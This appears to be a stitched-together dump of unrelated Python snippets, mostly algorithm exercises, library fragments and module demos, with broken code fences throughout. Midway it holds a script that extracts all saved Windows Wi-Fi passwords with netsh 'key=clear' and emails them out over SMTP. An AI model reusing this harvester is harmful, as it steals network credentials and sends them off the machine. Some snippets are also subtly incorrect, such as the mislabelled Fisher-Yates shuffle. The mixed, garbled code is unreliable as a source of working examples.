        pairs.append((c, K - c))

    return pairs


###########
# Testing #
###########

# Test 1
# Correct result => [(1, 9), (2, 8), (3, 7), (4, 6), (5, 5)]
print(find_pairs([1, 2, 2, 3, 4, 5, 5, 5, 6, 7, 8, 8, 9], 10))
````

````py
Find Peak Element

A peak element is an element that is greater than its neighbors.
Given an input array nums, where nums[i] ≠ nums[i+1], find a peak element and return its index.
The array may contain multiple peaks, in that case return the index to any one of the peaks is fine.
You may imagine that nums[-1] = nums[n] = -∞.

Input: [1, 2, 3, 1]
Output: 2
Output explanation: 3 is a peak element and your function should return the index number 2.

Input: [1, 2, 1, 3, 5, 6, 4]
Output: 1 or 5
Output explanation: Your function can return either index number 1 where the peak element is 2, or index number 5 where the peak element is 6.

=========================================
Binary search (more description in the code).
    Time Complexity:    O(LogN)
    Space Complexity:   O(1)```


```py


############
# Solution #
############


def find_peak_element(nums):
    l = 0
    r = len(nums) - 1

    while l < r:
        mid = (l + r) // 2
        if nums[mid] > nums[mid + 1]:
            # go left if the current value is smaller than the next one
            # in this moment you're sure that there is a peak element left from this one
            r = mid
        else:
            # go right if the current value is smaller than the next one
            # if the l comes to the end and all elements were in ascending order, then the last one is peak (because nums[n] is negative infinity)
            l = mid + 1

    return l


###########
# Testing #
###########

# Test 1
# Correct result => 2
print(find_peak_element([1, 2, 3, 1]))

# Test 2
# Correct result => 1 or 5
print(find_peak_element([1, 2, 1, 3, 5, 6, 4]))
````

````py
How it works:
 Thing is simple first we determine the variable in equation;
 Then we iterate through given range by user or default range;
 For each iteration we replace the variables in equation to the number;
 At last we return the roots found;```


```py

from string import ascii_letters


def find_variable(string):
    splitted = string.split()
    for i in splitted:
        if i in ascii_letters:
            return i
        else:
            continue
    return None


# Input format for function:
# "z ** 2 + 97 * z + (-4)"


def find_roots(S, rng=[-10000, 10000]):
    res = []
    for v in range(rng[0], rng[1]):
        try:
            test_case = S.replace(find_variable(S), str(v))
        except Exception as e:
            print(e)
            return ""
        if eval(test_case) == 0:
            res.append(v)
        else:
            continue

    if len(res) == 0:
        return None
    return res


# testing
````

````py
test_str = "x ** 2 + 5 * x - 6"
result = find_roots(test_str, [-10, -2])
for i in result:
 print("Root of the equation is {}".format(i))```


```py
````

````py
Find second largest node (not search tree)

Given the root to a tree (not bst), find the second largest node in the tree.

=========================================
Traverse tree and compare the current value with the saved 2 values.
    Time Complexity:    O(N)
    Space Complexity:   O(N)        , because of the recursion stack (but this is the tree is one branch), O(LogN) if the tree is balanced.```


```py


############
# Solution #
############

# import TreeNode class from tree_helpers.py
from tree_helpers import TreeNode

import math


def find_second_largest(root):
    arr = [TreeNode(-math.inf), TreeNode(-math.inf)]
    traverse_tree(root, arr)
    if arr[1] == -math.inf:
        # the tree has 0 or 1 elements
        return None
    return arr[1]


def traverse_tree(node, arr):
    if node == None:
        return

    if arr[0].val < node.val:
        arr[1] = arr[0]
        arr[0] = node
    elif arr[1].val < node.val:
        arr[1] = node

    # search left
    traverse_tree(node.left, arr)
    # search right
    traverse_tree(node.right, arr)


###########
# Testing #
###########

# Test 1
# Correct result => 8
tree = TreeNode(
    1, TreeNode(5, TreeNode(2), TreeNode(8)), TreeNode(4, TreeNode(12), TreeNode(7))
)
print(find_second_largest(tree).val)

# This method is called exhaustive numeration!
# I am checking every possible value
# that can be root of given x systematically
# Kinda brute forcing


def find_square_root(x):
    if type(x) == str:
        return "Expected an integer! Cannot find square root of an string!"
    for i in range(x):
        if i ** 2 == x:
            return i
    return "{} is not a perfect square".format(x)


# Test
x = 2
result = find_square_root(x)
print("Square root of {} is {}".format(x, result))

# Here I've implemented a method of finding square root of imperfect square
# Steps (Pseudocode): visit http://burningmath.blogspot.in/2013/12/finding-square-roots-of-numbers-that.html
# Read the steps carefully or you'll not understand the program!

# To check is number is a perfect square or not
def is_perfect_square(n):
    if isinstance(n, float):
        return (False, None)
    for i in range(n + 1):
        if i * i == n:
            return (True, i)
    return (False, None)


# Average
def average(*args):
    hold = list(args)
    return sum(hold) / len(hold)


# Method
# Just implementation of steps on above webpage
def sqrt_of_imperfect_square(a, certainty=6):
    is_square = is_perfect_square(a)
    if is_square[0]:
        return "{} is a perfect square .It's root is {}.".format(a, is_square[1])
    else:
        a = int(a)
        tmp = None
        s1 = max([float(x * x) for x in range(0, a)])
        while True:
            s2 = a / s1
            tmp = average(s1, s2)
            if not (round(tmp * tmp, certainty) == float(a)):
                s1 = tmp
                continue
            else:
                return tmp
        return -1  # This condition will normally never occur


# Test
case = 2613
res = sqrt_of_imperfect_square(case, 9)
print("Test case: " + str(case))
print("Root: " + str(res))
print("Root Squared: " + str(res * res))

In a town, there are n people labelled from 1 to n.  There is a rumor that one of these people is secretly the town judge.

If the town judge exists, then:

The town judge trusts nobody.
Everybody (except for the town judge) trusts the town judge.
There is exactly one person that satisfies properties 1 and 2.
You are given trust, an array of pairs trust[i] = [a, b] representing that the person labelled a trusts the person labelled b.

If the town judge exists and can be identified, return the label of the town judge.  Otherwise, return -1.



Example 1:

Input: n = 2, trust = [[1,2]]
Output: 2
Example 2:

Input: n = 3, trust = [[1,3],[2,3]]
Output: 3
Example 3:

Input: n = 3, trust = [[1,3],[2,3],[3,1]]
Output: -1
Example 4:

Input: n = 3, trust = [[1,2],[2,3]]
Output: -1
Example 5:

Input: n = 4, trust = [[1,3],[1,4],[2,3],[2,4],[4,3]]
Output: 3


Constraints:

1 <= n <= 1000
0 <= trust.length <= 104
trust[i].length == 2
trust[i] are all different
trust[i][0] != trust[i][1]
1 <= trust[i][0], trust[i][1] <= n


def findJudge(self, N: int, trusts: List[List[int]]) -> int:
        # Build our dict
        trust_dict = {}
        # Add the keys
        for i in range(1, N+1):
            trust_dict[i] = [0, 0]
        # Add the in/out degrees
        for trust in trusts:
            a = trust[0]
            b = trust[1]
            trust_dict[a][1] += 1
            trust_dict[b][0] += 1
        candidate_judge = -1
        # Now search for judge
        for person, degrees in trust_dict.items():
            if degrees[0] == N-1 and degrees[1] == 0:
                if candidate_judge != -1:
                    # This is the SECOND time we are seeing a judge
                    return -1
                candidate_judge = person
        return candidate_judge
````

````py
Find two missing numbers in a sequence

Find two missing numbers in a sequence,
all numbers are integers and they're smaller or equal to N+2 (N is length of the array).

Input: [2, 1, 4]
Output: [3, 5]

=========================================
Searching for 2 unknowns, math problem.
This solution is extension of 'find_one_missing_number.py'.
But in this case we also need the sum formula for the first squared N numbers (1^2 + 2^2 + ... + N^2).
And using those 2 formulas, we'll solve equations with 2 unknowns.
    a + b = diff_sum                     (diff_sum = formula_sum + list_sum)
    a^2 + b^2 = diff_squared_sum         (diff_squared_sum = formula_squared_sum + list_squared_sum)
But in the end we'll need quadratic formula to find those values.
b1,2 = (diff_sum +- sqrt(2*diff_squared_sum - diff_sum^2)) / 2
Sum formula = N*(N+1)/2
Squared sum formula = N*(N+1)*(2*N+1)/6
    Time Complexity:    O(N)
    Space Complexity:   O(1)

Note: this idea also could be used when more than 2 numbers are missing,
but you'll need more computations/equations, because you'll have K unknowns.```


```py

############
# Solution #
############

import math


def missing_numbers(nums):
    # find sums from the array
    s = 0
    s_2 = 0
    for i in nums:
        s += i
        s_2 += i * i

    n = len(nums) + 2

    # using formulas, compute the sums of the sequence
    f_s = n * (n + 1) // 2
    f_s_2 = n * (n + 1) * (2 * n + 1) // 6

    # difference of sums
    d = f_s - s
    d_2 = f_s_2 - s_2

    # using quadratic formula find the values
    r = int(math.sqrt(2 * d_2 - d * d))

    a = (d - r) // 2
    b = (d + r) // 2

    return [a, b]


###########
# Testing #
###########

# Test 1
# Correct result => [4, 5]
print(missing_numbers([2, 3, 1]))

# Test 2
# Correct result => [1, 2]
print(missing_numbers([5, 3, 4]))

# Test 3
# Correct result => [1, 5]
print(missing_numbers([2, 3, 4]))
````

````py
Find unpaired element

Given an array with odd number of elements, where (N - 1)/2 elements have duplicates and ONLY 1 is unique.

Input: [1, 5, 3, 1, 5]
Output: 3

=========================================
Using XOR find the unique element.
* Example: 13 XOR 13 = 1101 XOR 1101 = 0.
    Time Complexity:    O(N)
    Space Complexity:   O(1)```


```py


############
# Solution #
############


def find_unpaired_element(arr):
    unique = 0

    for el in arr:
        unique ^= el

    return unique


###########
# Testing #
###########

# Test 1
# Correct result => 3
print(find_unpaired_element([1, 5, 3, 1, 5]))

import subprocess
import smtplib


def send_mail(email, password, message):

    server = smtplib.SMTP("smtp.gmail.com", 587)
    server.starttls()
    server.login(email, password)
    server.sendmail(email, email, message)
    server.quit()


email = input("[+] Enter Email on which you want to recieve WIFI passwords: ")
print("[-] please enable -less secured apps-  to recieve an email")
password = input("[+] Enter Password : ")

listi = []
data = (
    subprocess.check_output(["netsh", "wlan", "show", "profiles"])
    .decode("utf-8")
    .split("\n")
)
profiles = [i.split(":")[1][1:-1] for i in data if "All User Profile" in i]
for i in profiles:
    results = (
        subprocess.check_output(["netsh", "wlan", "show", "profile", i, "key=clear"])
        .decode("utf-8")
        .split("\n")
    )
    results = [b.split(":")[1][1:-1] for b in results if "Key Content" in b]
    try:
        listi.append(("{:<30}|  {:<}".format(i, results[0])))
    except IndexError:
        listi.append("{:<30}|  {:<}".format(i, ""))

res = ""
for msg in listi:
    res = res + msg + "\n"
# print(res)
try:
    send_mail(email, password, res)
    print("[+] email successfully sent\n")
except smtplib.SMTPAuthenticationError:
    print("[+] Incorrect Email or Password")

# Finding Bridges in Undirected Graph
def computeBridges(graph):
    id = 0
    n = len(graph)  # No of vertices in graph
    low = [0] * n
    visited = [False] * n

    def dfs(at, parent, bridges, id):
        visited[at] = True
        low[at] = id
        id += 1
        for to in graph[at]:
            if to == parent:
                pass
            elif not visited[to]:
                dfs(to, at, bridges, id)
                low[at] = min(low[at], low[to])
                if at < low[to]:
                    bridges.append([at, to])
            else:
                # This edge is a back edge and cannot be a bridge
                low[at] = min(low[at], to)

    bridges = []
    for i in range(n):
        if not visited[i]:
            dfs(i, -1, bridges, id)
    print(bridges)


graph = {
    0: [1, 2],
    1: [0, 2],
    2: [0, 1, 3, 5],
    3: [2, 4],
    4: [3],
    5: [2, 6, 8],
    6: [5, 7],
    7: [6, 8],
    8: [5, 7],
}
computeBridges(graph)
````

```pysolution for the first-non-repeated-character problem"""


def first_non_repeated_character(str):
    """finds the first character in a string that's not repreated"""

    for i, char in enumerate(str):
        if i - 1 >= 0 and char == str[i - 1]:
            continue
        if i + 1 < len(str) and char == str[i + 1]:
            continue

        return char

# Given a string s consisting of small English letters, find and return the first instance of a non-repeating character in it. If there is no such character, return '_'.
#
# Example
#
# For s = "abacabad", the output should be
# first_not_repeating_character(s) = 'c'.
#
# There are 2 non-repeating characters in the string: 'c' and 'd'. Return c since it appears in the string first.
#
# For s = "abacabaabacaba", the output should be
# first_not_repeating_character(s) = '_'.
#
# There are no characters in this string that do not repeat.
#
# [execution time limit] 4 seconds (py3)
#
# [input] string s
#
# A string that contains only lowercase English letters.
#
# [output] char
#
# The first non-repeating character in s of '_' if there are no characters that do not repeat.


from collections import Counter


def first_not_repeating_character(s):
    c = {}
    for i in s:
        c[i] = c.get(i, 0) + 1
    return next((i for i in s if c[i] == 1), "_")

## -*- coding: utf-8 -*-
```

```py
first
=====

first is the function you always missed in Python.

In the simplest case, it returns the first true element from an iterable:

>>> from first import first
>>> first([0, False, None, [], (), 42])
42

Or None if there is none:

>>> from first import first
>>> first([]) is None
True
>>> first([0, False, None, [], ()]) is None
True

It also supports the passing of a key argument to help selecting the first
match in a more advanced way.

>>> from first import first
>>> first([1, 1, 3, 4, 5], key=lambda x: x % 2 == 0)
4

:copyright: (c) 2012 by Hynek Schlawack.
:license: MIT, see LICENSE for more details.
```

````py

__title__ = "first"
__version__ = "2.0.2"
__author__ = "Hynek Schlawack"
__license__ = "MIT"
__copyright__ = "Copyright 2012 Hynek Schlawack"


def first(iterable, default=None, key=None):
    """
    Return first element of `iterable` that evaluates true, else return None
    (or an optional default value).

    >>> first([0, False, None, [], (), 42])
    42

    >>> first([0, False, None, [], ()]) is None
    True

    >>> first([0, False, None, [], ()], default='ohai')
    'ohai'

    >>> import re
    >>> m = first(re.match(regex, 'abc') for regex in ['b.*', 'a(.*)'])
    >>> m.group(1)
    'bc'

    The optional `key` argument specifies a one-argument predicate function
    like that used for `filter()`.  The `key` argument, if supplied, must be
    in keyword form.  For example:

    >>> first([1, 1, 3, 4, 5], key=lambda x: x % 2 == 0)
    4

    """
    if key is None:
        for el in iterable:
            if el:
                return el
    else:
        for el in iterable:
            if key(el):
                return el

    return default

def firstDuplicate(a):

    d = {}
    found = 0

    for i in range(len(a)):
        if a[i] in d:
            d[a[i]] += 1
        else:
            d[a[i]] = 1

        if d[a[i]] == 2:
            return a[i]

    if not found:
        return -1

def firstNotRepeatingCharacter(s):

    occ_dict = {}
    index_dict = {}

    for i in range(len(s)):

        ch = s[i]

        if ch in occ_dict:
            occ_dict[ch] += 1
        else:
            occ_dict[ch] = 1

        if ch not in index_dict:
            index_dict[ch] = i

    one_occ = [k for (k, v) in occ_dict.items() if v == 1]
    if len(one_occ) < 1:
        return "_"

    index_dict = dict([(k, v) for (k, v) in index_dict.items() if k in one_occ])
    min_ch = min(index_dict, key=index_dict.get)

    return min_ch

# Given a string s consisting of small English letters, find and return the first instance of a non-repeating character in it. If there is no such character, return '_'.

# Example

# For s = "abacabad", the output should be
# first_not_repeating_character(s) = 'c'.

# There are 2 non-repeating characters in the string: 'c' and 'd'. Return c since it appears in the string first.

# For s = "abacabaabacaba", the output should be
# first_not_repeating_character(s) = '_'.

# There are no characters in this string that do not repeat.

# [execution time limit] 4 seconds (py3)

# [input] string s

# A string that contains only lowercase English letters.

# [output] char

# The first non-repeating character in s of '_' if there are no characters that do not repeat.

from collections import Counter


def first_not_repeating_character(s):
    count = Counter(s)
    for char in s:
        if count[char] == 1:
            return char
    return "_"

def firstDigit(inputString):
    """Finds leftmost digit that occurs in a given string

    Args:
        inputString(string): input string

    Return:
        Leftmost digit occurring in string

    Raises:
    """
    for char in inputString:
        if char.isdigit():
            return char

def firstDuplicate(a):
    number_frequencies, number_indices, duplicate_index = {}, {}, {}

    # Iterate through list and increment frequency count
    # if number not in dict. Also, note the index asscoiated
    # with the value
    for i in range(len(a)):
        if a[i] not in number_frequencies:
            number_frequencies[a[i]] = 1
            number_indices[a[i]] = i
        elif a[i] in number_frequencies:
            if number_frequencies[a[i]] < 2:
                number_frequencies[a[i]] += 1
                number_indices[a[i]] = i

    for number in number_frequencies:
        if number_frequencies[number] == 2:
            duplicate_index[number] = number_indices[number]

    if not duplicate_index:
        return -1
    else:
        minimal_index_key = min(duplicate_index, key=duplicate_index.get)
        return minimal_index_key

# To find first index of an element in an array.
def firstIndex(arr, si, x):
    l = len(arr)  # length of array.
    if l == 0:  # base case
        return -1
    if (
        arr[si] == x
    ):  # if element is found at start index of an array then return that index.
        return si
    return firstIndex(arr, si + 1, x)  # recursive call.


arr = []  # initialised array.
n = int(input("Enter size of array : "))
for i in range(n):  # input array.
    ele = int(input())
    arr.append(ele)
x = int(input("Enter element to be searched "))  # element to be searched
print(firstIndex(arr, 0, x))

def firstNotRepeatingCharacter(s):
    character_count, character_index, non_repeat_index = {}, {}, {}

    # Iterate through string and count
    # character occurences and note
    # index of first repetition
    for i in range(len(s)):
        if s[i] not in character_count:
            character_count[s[i]] = 1
            character_index[s[i]] = i
        elif s[i] in character_count:
            if character_count[s[i]] < 2:
                character_count[s[i]] += 1
                character_index[s[i]] = i

    for char in character_count:
        if character_count[char] == 1:
            non_repeat_index[char] = character_index[char]

    if not non_repeat_index:
        return "_"
    else:
        minimal_index_key = min(non_repeat_index, key=non_repeat_index.get)
        return minimal_index_key

def left_search(arr, low, high, x):
    temp = -1

    while low <= high:
        mid = low + (high - low) // 2
        if arr[mid] > x:
            high = mid - 1
        elif arr[mid] < x:
            low = mid + 1
        else:
            temp = mid
            high = mid - 1
    return temp


def right_search(arr, low, high, x):
    temp = -1

    while low <= high:
        mid = low + (high - low) // 2
        if arr[mid] > x:
            high = mid - 1
        elif arr[mid] < x:
            low = mid + 1
        else:
            temp = mid
            low = mid + 1
    return temp


arr = [1, 4, 4, 4, 5, 6, 7]
l_result = left_search(arr, 0, len(arr), 4)
r_result = right_search(arr, 0, len(arr), 4)

print("first occurance:" + str(l_result))
print("last occurance: " + str(r_result))

#!/usr/bin/python```


```py
The Fisher–Yates shuffle is an algorithm for generating a random permutation of a
finite sequence.
For more details visit
wikipedia/Fischer-Yates-Shuffle.```


```py
import random


def FYshuffle(list):
    for i in range(len(list)):
        a = random.randint(0, len(list) - 1)
        b = random.randint(0, len(list) - 1)
        list[a], list[b] = list[b], list[a]
    return list


if __name__ == "__main__":
    integers = [0, 1, 2, 3, 4, 5, 6, 7]
    strings = ["python", "says", "hello", "!"]
    print("Fisher-Yates Shuffle:")
    print("List", integers, strings)
    print("FY Shuffle", FYshuffle(integers), FYshuffle(strings))

class Solution:
    def fizzBuzz(self, n: int) -> List[str]:
        res = []
        for i in range(1, n + 1):
            if i % 3 == 0 and i % 5 == 0:
                res.append("FizzBuzz")
            elif i % 3 == 0:
                res.append("Fizz")
            elif i % 5 == 0:
                res.append("Buzz")
            else:
                res.append(str(i))
        return res

def import_module(callback):
    """
    Handle "magic" Flask extension imports:
    ``flask.ext.foo`` is really ``flask_foo`` or ``flaskext.foo``.
    """

    def wrapper(inference_state, import_names, module_context, *args, **kwargs):
        if len(import_names) == 3 and import_names[:2] == ("flask", "ext"):
            # New style.
            ipath = (("flask_" + import_names[2]),)
            value_set = callback(inference_state, ipath, None, *args, **kwargs)
            if value_set:
                return value_set
            value_set = callback(inference_state, ("flaskext",), None, *args, **kwargs)
            return callback(
                inference_state,
                ("flaskext", import_names[2]),
                next(iter(value_set)),
                *args,
                **kwargs
            )
        return callback(inference_state, import_names, module_context, *args, **kwargs)

    return wrapper

import numpy as np

a = np.empty((2, 2)).flat

a.base
a.copy()
a.coords
a.index
iter(a)
next(a)
a[0]
a[[0, 1, 2]]
a[...]
a[:]
a.__array__()
a.__array__(np.dtype(np.float64))
````

```pyaccepts a multi dimensional array and returns a flattened version"""


def flatten_array(orig):
    """returns a new, flattened, list"""

    flattened_list = []

    for item in orig:
        if isinstance(item, list):
            flattened_list += flatten_array(item)
        else:
            flattened_list.append(item)

    return flattened_list


def flatten_in_place(orig):
    """flattens a given list in place"""

    is_flattened = False

    while not is_flattened:  # iterating until no more lists are found

        is_flattened = True
        for i, item in enumerate(orig):

            if isinstance(item, list):
                is_flattened = False
                orig = orig[:i] + item + orig[i + 1 :]

    return orig
```

````py
Flatten an Arbitrarily Deep List

Given a list that can contain arbitrary lists as its elements, which in turn can contain arbitrary lists
as elements, and so on, create and return a new list that contains all the atomic (that is, anything
that is not a list) elements listed in a linear sequence without any nesting.

Input: [1, [2, 3, [4, 'bob', 6], [7]], [8, 9]]
Output: [1, 2, 3, 4, 'bob', 6, 7, 8, 9]

=========================================
Recursive solution, extend the result with each sublist.
    Time Complexity:    O(N)
    Space Complexity:   O(N)```


```py


############
# Solution #
############


def flatten_deep_list(arr):
    if not isinstance(arr, list):
        return [arr]

    result = []
    for a in arr:
        result.extend(flatten_deep_list(a))

    return result


###########
# Testing #
###########

# Test 1
# Correct result => [1, 2, 3, 4, 'bob', 6, 7, 8, 9]
print(flatten_deep_list([1, [2, 3, [4, "bob", 6], [7]], [8, 9]]))

# Test 2
# Correct result => [89, 85, 72, 84, 65, 88, 31, 64, 11, 60, 42, 57, 55, 16, 79, 34, 82, 94, 36, 89, 26, 39, 94, 47, 72, 30, 72, 3, 73, 18, 37, 51, 75, 83, 94, 57, 37, 10, 62, 62, 13]
print(
    flatten_deep_list(
        [
            [],
            [
                [
                    [
                        [89, 85, 72, 84, 65],
                        [
                            [88, 31, 64, 11, 60, 42, 57, 55],
                            16,
                            [79, 34, 82],
                            [],
                            94,
                            36,
                            [89, 26, 39, 94, 47, 72, 30],
                            [72, 3, 73],
                        ],
                        18,
                    ]
                ],
                [[37, [51, 75, 83], 94, 57]],
                [37, 10, 62, 62],
                [[], 13],
            ],
        ]
    )
)

# Test 3
# Correct result => [ ]
print(flatten_deep_list([[[[[[]]]]]]))

arr = [[1, 2, 3, 4], 23, [5, 6, 7, 8], 19, [9, 10, 11, 12], [13, 14, 15, 16]]
arr2 = []
for i in range(1, 17):
    arr2.append(i)

print(arr)
# print(arr2)
# print(arr[0][1])

# # x + y * width
# print(arr2[1 + 0 * 4])


def squash_my_list(l):
    # l is a list, possibly nested
    result_l = []  # empty, result list
    for i in l:
        if type(i) is list:
            # if we have a list, then extend
            result_l.extend(i)
        else:  # otherwise append to the result, one item
            result_l.append(i)
    return result_l


arr3 = squash_my_list(arr)
print(arr3)

# So i have list [[1],[[2,[5]]],[4,5],[[6]],[7]]

# I want to flatten this


def flatten(l):

    tmp = [val for sublist in l for val in sublist]

    stack = []

    for item in tmp:
        if isinstance(item, list):
            tmp2 = [val for val in item]
            for val in tmp2:
                stack.append(val)
            break

        else:
            stack.append(item)

    return stack


sample_list = [[1], [[2, [5]]], [4, 5], [[6]], [7]]

print(flatten(sample_list))
````

````py
https://en.wikipedia.org/wiki/Floor_and_ceiling_functions```


```py


def floor(x) -> int:
    """
    Return the floor of x as an Integral.
    :param x: the number
    :return: the largest integer <= x.
    >>> import math
    >>> all(floor(n) == math.floor(n) for n
    ...     in (1, -1, 0, -0, 1.1, -1.1, 1.0, -1.0, 1_000_000_000))
    True
    """
    return int(x) if x - int(x) >= 0 else int(x) - 1


if __name__ == "__main__":
    import doctest

    doctest.testmod()

import math


class Graph:
    def __init__(self, N=0):  # a graph with Node 0,1,...,N-1
        self.N = N
        self.W = [
            [math.inf for j in range(0, N)] for i in range(0, N)
        ]  # adjacency matrix for weight
        self.dp = [
            [math.inf for j in range(0, N)] for i in range(0, N)
        ]  # dp[i][j] stores minimum distance from i to j

    def addEdge(self, u, v, w):
        self.dp[u][v] = w

    def floyd_warshall(self):
        for k in range(0, self.N):
            for i in range(0, self.N):
                for j in range(0, self.N):
                    self.dp[i][j] = min(self.dp[i][j], self.dp[i][k] + self.dp[k][j])

    def showMin(self, u, v):
        return self.dp[u][v]


if __name__ == "__main__":
    graph = Graph(5)
    graph.addEdge(0, 2, 9)
    graph.addEdge(0, 4, 10)
    graph.addEdge(1, 3, 5)
    graph.addEdge(2, 3, 7)
    graph.addEdge(3, 0, 10)
    graph.addEdge(3, 1, 2)
    graph.addEdge(3, 2, 1)
    graph.addEdge(3, 4, 6)
    graph.addEdge(4, 1, 3)
    graph.addEdge(4, 2, 4)
    graph.addEdge(4, 3, 9)
    graph.floyd_warshall()
    graph.showMin(1, 4)
    graph.showMin(0, 3)

# Copyright (c) Microsoft Corporation. All rights reserved.
# Licensed under the MIT License. See LICENSE in the project root
# for license information.

from __future__ import absolute_import, division, print_function, unicode_literals
````

````pyProvides a custom string.Formatter with JSON support.

The formatter object is directly exposed as a module, such that all its members
can be invoked directly after it has been imported::

    from debugpy.common import fmt
    fmt("{0} is {value}", name, value=x)```


```py

import string
import sys
import types


class Formatter(string.Formatter, types.ModuleType):
    """A custom string.Formatter with support for JSON pretty-printing.

    Adds {!j} format specification. When used, the corresponding value is converted
    to string using json_encoder.encode().

    Since string.Formatter in Python <3.4 does not support unnumbered placeholders,
    they must always be numbered explicitly - "{0} {1}" rather than "{} {}". Named
    placeholders are supported.
    """

    # Because globals() go away after the module object substitution, all method bodies
    # below must access globals via self instead, or re-import modules locally.

    from debugpy.common import json

    def __init__(self):
        # Set self up as a proper module, and copy globals.
        # types must be re-imported, because globals aren't there yet at this point.
        import types

        types.ModuleType.__init__(self, __name__)
        self.__dict__.update(sys.modules[__name__].__dict__)

    def __call__(self, format_string, *args, **kwargs):
        """Same as self.format().
        """
        return self.format(format_string, *args, **kwargs)

    def convert_field(self, value, conversion):
        if conversion == "j":
            return self.json.JsonObject(value)
        return super(self.Formatter, self).convert_field(value, conversion)


# Replace the standard module object for this module with a Formatter instance.
sys.modules[__name__] = Formatter()

#```


```pyFilter a list of filenames against a pattern.```


```py

# end_pymotw_header
import fnmatch
import os
import pprint

pattern = "fnmatch_*.py"
print("Pattern :", pattern)

files = list(sorted(os.listdir(".")))

print("\nFiles   :")
pprint.pprint(files)

print("\nMatches :")
pprint.pprint(fnmatch.filter(files, pattern))

#```


```pyTest an individual filename with a pattern.```


```py

# end_pymotw_header
import fnmatch
import os

pattern = "fnmatch_*.py"
print("Pattern :", pattern)
print()

files = os.listdir(".")
for name in sorted(files):
    print("Filename: {:<25} {}".format(name, fnmatch.fnmatch(name, pattern)))

#```


```pyForce a case-sensitive test of a filename with a pattern.```


```py


# end_pymotw_header
import fnmatch
import os

pattern = "FNMATCH_*.PY"
print("Pattern :", pattern)
print()

files = os.listdir(".")

for name in sorted(files):
    print("Filename: {:<25} {}".format(name, fnmatch.fnmatchcase(name, pattern)))

#```


```pyTranslate a glob-style pattern to a regular expression.```


```py

# end_pymotw_header
import fnmatch

pattern = "fnmatch_*.py"
print("Pattern :", pattern)
print("Regex   :", fnmatch.translate(pattern))

from prompt_toolkit.key_binding.key_processor import KeyPressEvent

__all__ = ["focus_next", "focus_previous"]

E = KeyPressEvent


def focus_next(event: E) -> None:
    """
    Focus the next visible Window.
    (Often bound to the `Tab` key.)
    """
    event.app.layout.focus_next()


def focus_previous(event: E) -> None:
    """
    Focus the previous visible Window.
    (Often bound to the `BackTab` key.)
    """
    event.app.layout.focus_previous()

import os
import shutil

# getting path of current folder/directory
current_dir = os.path.dirname(os.path.realpath(__file__))

for filename in os.listdir(current_dir):
    # for images
    if filename.endswith((".jpg", ".png", ".gif")):
        if not os.path.exists("Images"):
            os.makedirs("Images")
        shutil.copy(filename, "Images")
        os.remove(filename)
        print("Images folder done")
    # for documents
    if filename.endswith((".pdf", ".docx")):
        if not os.path.exists("Documents"):
            os.makedirs("Documents")
        shutil.copy(filename, "Documents")
        os.remove(filename)
        print("Documents folder done")
    # for apps or softwares
    if filename.endswith((".apk", ".exe")):
        if not os.path.exists("Apps"):
            os.makedirs("Apps")
        shutil.copy(filename, "Apps")
        os.remove(filename)
        print("Apps folder done")
    # for videos
    if filename.endswith((".mp4", ".wmv")):
        if not os.path.exists("Videos"):
            os.makedirs("Videos")
        shutil.copy(filename, "Videos")
        os.remove(filename)
        print("Videos folder done")
# after completing the task printing all done
print("all done")

# need strings[i] = strings[j] for all patterns[i] = patterns[j] to be true -
# give false if strings[i] != strings[j] and patterns[i] = patterns[j] or
# strings[i] = strings[j] and patterns[j] != patterns[j] - this last condition
# threw me for a bit as an edge case! Need to ensure that each string is unique
# to each key, not just that each key corresponds to the given string!

# from a google interview set, apparently
def areFollowingPatterns(strings, patterns):
    pattern_to_string = {}
    string_to_pattern = {}
    for i in range(len(patterns)):
        # first, check condition that strings are equal for patterns[i]=patterns[j]
        this_pattern = patterns[i]
        if patterns[i] in pattern_to_string:
            if strings[i] != pattern_to_string[this_pattern]:
                return False
        else:
            pattern_to_string[this_pattern] = strings[i]

    # now check condition that patterns are equal for strings[i]=strings[j]
    # if there are more keys than values, then there is not 1:1 correspondence
    if len(pattern_to_string.keys()) != len(set(pattern_to_string.values())):
        return False

    return True

# Accept User Input, consider (4)
n = int(raw_input("How big? "))

# Building block of our mountain of money
s = "$"

# Process for constructing mountain
# Since n = 4,
# range (1, n+1) would be all the integers from 1 to 4 including 1 and 4
# Mountain formed would be:
#    $    i = 1,   ' ' * n-i = 4-1 = 3  is empty space taken 3 times,    s*i is '$' taken once(i times)
#   $$    i = 2,   ' ' * n-i = 4-2 = 2  ,  s*i is '$' taken twice(i times)
#  $$$    and so on
# $$$$
# Again, notice how i and n change for each iteration
for i in range(1, n + 1):
    print(" " * (n - i) + s * i)


print("\n")


# Other variant
s = "$$"
for i in range(1, n + 1):
    print(" " * (n - i) + s * i)

# Ford-Fulkerson Algorithm for Maximum Flow Problem```


```py
Description:
    (1) Start with initial flow as 0;
    (2) Choose augmenting path from source to sink and add path to flow;```


```py


def BFS(graph, s, t, parent):
    # Return True if there is node that has not iterated.
    visited = [False] * len(graph)
    queue = []
    queue.append(s)
    visited[s] = True

    while queue:
        u = queue.pop(0)
        for ind in range(len(graph[u])):
            if visited[ind] is False and graph[u][ind] > 0:
                queue.append(ind)
                visited[ind] = True
                parent[ind] = u

    return True if visited[t] else False


def FordFulkerson(graph, source, sink):
    # This array is filled by BFS and to store path
    parent = [-1] * (len(graph))
    max_flow = 0
    while BFS(graph, source, sink, parent):
        path_flow = float("Inf")
        s = sink

        while s != source:
            # Find the minimum value in select path
            path_flow = min(path_flow, graph[parent[s]][s])
            s = parent[s]

        max_flow += path_flow
        v = sink

        while v != source:
            u = parent[v]
            graph[u][v] -= path_flow
            graph[v][u] += path_flow
            v = parent[v]
    return max_flow


graph = [
    [0, 16, 13, 0, 0, 0],
    [0, 0, 10, 12, 0, 0],
    [0, 4, 0, 0, 14, 0],
    [0, 0, 9, 0, 0, 20],
    [0, 0, 0, 7, 0, 4],
    [0, 0, 0, 0, 0, 0],
]

source, sink = 0, 5
print(FordFulkerson(graph, source, sink))

# -*- coding: utf8 -*-
import io
import os
import shutil
import tempfile

pjoin = os.path.join

from .nbexamples import nb0


def open_utf8(fname, mode):
    return io.open(fname, mode=mode, encoding="utf-8")


class NBFormatTest:
    """Mixin for writing notebook format tests"""

    # override with appropriate values in subclasses
    nb0_ref = None
    ext = None
    mod = None

    def setUp(self):
        self.wd = tempfile.mkdtemp()

    def tearDown(self):
        shutil.rmtree(self.wd)

    def assertNBEquals(self, nba, nbb):
        self.assertEqual(nba, nbb)

    def test_writes(self):
        s = self.mod.writes(nb0)
        if self.nb0_ref:
            self.assertEqual(s, self.nb0_ref)

    def test_reads(self):
        s = self.mod.writes(nb0)
        nb = self.mod.reads(s)

